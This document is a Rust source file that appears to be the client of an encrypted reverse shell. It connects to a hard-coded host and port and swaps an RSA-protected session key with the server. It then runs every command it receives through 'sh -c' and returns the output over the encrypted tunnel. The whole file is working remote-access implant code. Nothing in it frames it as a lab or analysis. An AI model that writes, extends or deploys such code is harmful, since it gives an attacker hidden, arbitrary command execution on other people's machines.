mod crypto;

use crate::crypto::EncryptedTunnel;

use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::process::Command;

use rand::{distributions::Alphanumeric, Rng};
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::{Pkcs1v15Encrypt, RsaPublicKey};

// TODO: add commands

const BUFFER: usize = 1024;

fn generate_fingerprint() -> String {
    rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(30)
        .map(char::from)
        .collect()
}

fn generate_bytes(l: usize) -> Vec<u8> {
    rand::thread_rng()
        .gen::<[u8; 32]>()
        .iter()
        .take(l)
        .cloned()
        .collect()
}

fn main() -> Result<(), io::Error> {
    let mut rng = rand::thread_rng();
    let mut buffer = [0; BUFFER];
    let fingerprint = generate_fingerprint();

    let mut socket = TcpStream::connect("127.0.0.1:7777")?;

    socket.write_all(fingerprint.as_bytes())?;

    let public_key = {
        let readed = socket.read(&mut buffer)?;
        RsaPublicKey::from_pkcs1_pem(
            String::from_utf8_lossy(&mut buffer[..readed])
                .to_string()
                .as_str(),
        )
        .expect("Invalid key")
    };

    let key = generate_bytes(32);
    let iv = generate_bytes(8);

    {
        let mut keyiv_concat: Vec<u8> = Vec::new();

        keyiv_concat.extend(&key);
        keyiv_concat.extend(&iv);

        socket.write_all(
            &public_key
                .encrypt(&mut rng, Pkcs1v15Encrypt, &keyiv_concat)
                .unwrap(),
        )?;
    }

    let mut enctunnel = EncryptedTunnel::new(key.as_slice(), iv.as_slice(), socket);

    loop {
        let cmd = String::from_utf8(enctunnel.recv(&mut buffer)?).unwrap();

        match cmd.as_str() {
            "2" => {
                enctunnel.send(b"3".to_vec()).unwrap();
            }
            _ => {
                let mut output = Command::new("sh")
                    .arg("-c")
                    .arg(cmd)
                    .output()
                    .expect("Failed execute command");

                output.stdout.extend(output.stderr);

                enctunnel.send(output.stdout).unwrap();
            }
        }
    }
}
